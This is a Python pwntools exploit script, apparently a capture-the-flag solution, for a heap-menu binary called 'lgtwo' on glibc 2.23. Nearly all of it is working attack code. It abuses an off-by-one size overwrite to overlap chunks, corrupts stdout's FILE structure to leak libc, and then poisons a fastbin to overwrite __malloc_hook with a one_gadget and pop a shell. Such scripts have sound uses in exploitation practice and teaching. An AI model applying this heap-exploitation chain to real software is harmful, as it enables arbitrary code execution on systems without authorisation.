#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- author: n0trix -*-

from pwn import *

#context.terminal = ['tmux','splitw','-v']
context.log_level = 'debug'
#io = remote('123.56.52.128',45830)
elf = ELF('./lgtwo')
libc   = ELF('/mnt/hgfs/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so')
ld     = ELF('/mnt/hgfs/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so')
io     = process(argv=[ld.path,elf.path],env={"LD_PRELOAD" : libc.path})

def add(size,con='A'):
    io.sendlineafter('>> ','1')
    io.sendlineafter('size?\n',str(size))
    io.sendafter('content?\n',con)

def add2(size,con='A'):
    io.sendlineafter('>> ','1')
    io.sendlineafter('size?',str(size))
    io.sendafter('content?',con)


def dele(idx):
    io.sendlineafter('>> ','2')
    io.sendlineafter('index ?\n',str(idx))
def dele2(idx):
    io.sendlineafter('>> ','2')
    io.sendlineafter('index ?',str(idx))

def edit(idx,con):
    io.sendlineafter('>> ','4')
    io.sendlineafter('index ?\n',str(idx))
    io.sendafter('content ?\n',con)

def edit2(idx,con):
    io.sendlineafter('>> ','4')
    io.sendlineafter('index ?',str(idx))
    io.sendafter('content ?',con)
#fake = 0x7f0823975620
add(0x18) #0
add(0x18) #1
add(0x68) #2
add(0x18) #3
add(0x10) #4
gdb.attach(io)
edit(0,'A'*0x18+'\xb1') #0
#unsort
dele(1)
#fastbin
dele(2)

add(0x18) #1
add(0x88) #2
edit(2,'\xdd\x25')
edit(1,'a'*0x18+p8(0x70))
#gdb.attach(io)
add(0x68) #5
add(0x68) #6
edit(6,0x33*'\x00'+p64(0xfbad1800)+p64(0)*3+'\x00')
libc_base = u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 3954176
log.success('libc: '+hex(libc_base))
system = libc_base + libc.sym['system']
one = [0x45226,0x4527a,0xf0364,0xf1207]

add2(0x18) #7
add2(0x18) #8
add2(0x68) #9
add2(0x18) #10
add2(0x10) #11

edit2(7,'A'*0x18+'\xb1')
dele2(8)
dele2(9)
add2(0x18) #8
add2(0x88) #9
edit2(9,p64(libc_base+libc.sym['__malloc_hook']-0x23))
edit2(8,'a'*0x18+p8(0x70))
add2(0x68) #12
add2(0x68) #13
edit2(13,(0x13-8)*'\x00'+p64(one[1]+libc_base)+p64(libc_base+libc.sym['realloc']+2))
#edit2(13,0x13*'\x00'+p64(one[0]+libc_base))
io.sendlineafter('>> ','1')
io.sendlineafter('size?','10')
io.interactive()
